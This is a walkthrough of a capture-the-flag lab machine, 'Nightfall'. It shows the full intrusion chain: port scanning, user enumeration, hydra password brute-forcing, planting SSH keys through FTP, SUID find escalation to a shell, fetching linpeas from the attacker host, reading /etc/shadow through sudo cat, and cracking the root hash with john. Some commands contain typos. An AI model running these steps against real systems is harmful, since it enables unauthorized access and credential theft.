I started with a nmap scan to see what ports are open

# nmap results

```nmap
Nmap scan report for 10.0.2.254
Host is up (0.00012s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         pyftpdlib 1.5.5
| ftp-syst: 
|   STAT: 
| FTP server status:
|  Connected to: 10.0.2.254:21
|  Waiting for username.
|  TYPE: ASCII; STRUcture: File; MODE: Stream
|  Data connection closed.
|_End of status.
22/tcp   open  ssh         OpenSSH 7.9p1 Debian 10 (protocol 2.0)
| ssh-hostkey: 
|   2048 a9:25:e1:4f:41:c6:0f:be:31:21:7b:27:e3:af:49:a9 (RSA)
|   256 38:15:c9:72:9b:e0:24:68:7b:24:4b:ae:40:46:43:16 (ECDSA)
|_  256 9b:50:3b:2c:48:93:e1:a6:9d:b4:99:ec:60:fb:b6:46 (ED25519)
80/tcp   open  http        Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Apache2 Debian Default Page: It works
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
3306/tcp open  mysql       MySQL 5.5.5-10.3.15-MariaDB-1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.15-MariaDB-1
|   Thread ID: 14
|   Capabilities flags: 63486
|   Some Capabilities: FoundRows, SupportsCompression, Speaks41ProtocolOld, IgnoreSigpipes, Support41Auth, ConnectWithDatabase, SupportsTransactions, IgnoreSpaceBeforeParenthesis, DontAllowDatabaseTableColumn, LongColumnFlag, ODBCClient, InteractiveClient, SupportsLoadDataLocal, Speaks41ProtocolNew, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: gu7PkKs#QMpmP(u8S{4-
|_  Auth Plugin Name: mysql_native_password
MAC Address: 08:00:27:0B:BB:9E (Oracle VirtualBox virtual NIC)
Service Info: Host: NIGHTFALL; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h20m00s, deviation: 2h18m33s, median: 0s
|_nbstat: NetBIOS name: NIGHTFALL, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: nightfall
|   NetBIOS computer name: NIGHTFALL\x00
|   Domain name: nightfall
|   FQDN: nightfall.nightfall
|_  System time: 2021-07-13T22:56:11-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-07-14T02:56:11
|_  start_date: N/A

```

Seeing that it has ftp, samba and a web server I will start doing some recon on those 

I started with samba, using enum4linux I looked for shares and usernames on the computer

# enum4linux command

```bash
enum4linux -a 10.0.2.2.254 | tee enum4linux.log
```
I was unable to access any shares on the target machine but I did find two usernames

# enum4linux results

```bash
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\nightfall (Local User)
S-1-22-1-1001 Unix User\matt (Local User)
```

I also ran gobuster in the background to see if there where any hidden directories that I could find
but all it was able to find was index.html

# gobuster command

```bash
gobuster dir -u http://10.0.2.254 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x txt,php,html,js -o root.gobuster.log
```

I also ran nikto against the target machine but didn't get anything of value

# nikto command

```bash
nikto -h http://10.0.2.254
```

Having nothing else to go on except two usernames I tried to brute force ftp and ssh login credentials using hydra

I put the two usernames in a file named users and used that for the username list in hydra

# hydra commands

```bash
hydra -L users -P /usr/share/wordlists/rockyou.txt ftp://10.0.2.254

hydra -L users -P /usr/share/wordlists/rockyou.txt ssh://10.0.2.254
```

For some reason the hydra brute force didn't work for me with a file of usernames but when I did just one 
username I was able to crack the password

# hydra command for one user

```bash
hydra -l matt -p /usr/share/wordlists/rockyou.txt ftp://10.0.2.254
```

# hydra results

```bash
[21][ftp] host: 10.0.2.254   login: matt   password: cheese
```

Once I was logged in to the ftp server as the matt user, it looked like we were in his home directory. I found that I could upload
files to the ftp server so I made a .ssh directory in the ftp server and created a new ssh key on my kali (attack) machine.

# new directory in ftp server command

```bash
mkdir .ssh
```

# ssh key command

```bash
ssh-keygen
```

I then read the contents of my id_rsa.pub and redirected the output to a new file called authorized_keys, and uploaded
the new authorized_keys file to the ftp server

# cat command

```bash
cat /home/kali/.ssh/id_rsa.pub > authorzied_keys
```

# ftp upload command (after being logged in to the ftp server)

```bash
cd .ssh 

put authorzied_keys
```

After uploading the authorized_keys I was able to login to ssh with the matt user

# ssh login command

```bash
ssh matt@10.0.2.254
```

Once logged in as user matt I tried to run 'sudo -l' to see if I could run any commands as another
user to get a privilege escalation but I needed to know matt's password and we don't know his password

So after that failed I used the find command to see if there were any suid binaries 
on the target machine that could lead to a privilege escalation, and found that I could run find as the nightfall user

# find command and results

```bash
find / -type f -perm -4000 2>/dev/null

/scripts/find
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/su
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
```

Using 'https://gtfobins.github.io/gtfobins/find/' I found that I could escape the matt user shell and get access
to the nightfall user

# nightfall escalation command

```bash
./find . -exec /bin/bash -p \; -quit
```

# proof of nightfall user owned

```bash
bash-5.0$ whoami
nightfall
```

As the nightfall user I was able to navigate to their home directory and get the user flag

# user flag
```bash
97fb7140ca325ed96f67be3c9e30083d
```

I navigated to /dev/shm on the target machine and downloaded linpeas from my kali machine and ran it
to see if I could find out any more useful information about the target machine

# kali machine command for web server

This will start a http server on your kali (attack) machine

```bash
python -c http.server
```

# target machine wget command

```bash
wget http://10.0.2.242:8000/linpeas.sh 

chmod +x linpeas.sh 

./linpeas.sh 
```

After running linpeas, I found that it was ran as the user matt instead of the nightfall user, so I used the same
method of making a .ssh/authorized_keys file for the nightfall user and was able to ssh in to the target
machine as the nightfall user. I used the same authorized_keys file as I did with the matt user no need 
to make a new one

After being able to login with ssh as the nightfall user I ran linpeas again to see what I could find

Going through the output of linpeas I saw that I could run 'cat' command as root user without a password

```bash
User nightfall may run the following commands on nightfall:
    (root) NOPASSWD: /usr/bin/cat
```

Being able to run cat as root I read the /etc/shadow file and copied the hash for the root password
and stored it in a file called hash on my kali machine

# root password hash

```bash
$6$JNHsN5GY.jc9CiTg$MjYL9NyNc4GcYS2zNO6PzQNHY2BE/YODBUuqsrpIlpS9LK3xQ6coZs6lonzURBJUDjCRegMHSF5JwCMG1az8k.
```

I then ran john-the-ripper to crack the password of the root user

# john command

```bash
sudo john hash

sudo john --show hash
```

# john results

```bash
?:miguel2

1 password hash cracked, 0 left
```

With roots password we can su to root

# su command

```bash
su 

passowrd: miguel2
```

As root I navigated to the /root/ directory and was able to get the flag

# root flag

```bash
flag{9a5b21fc6719fe33004d66b703d70a39}
```
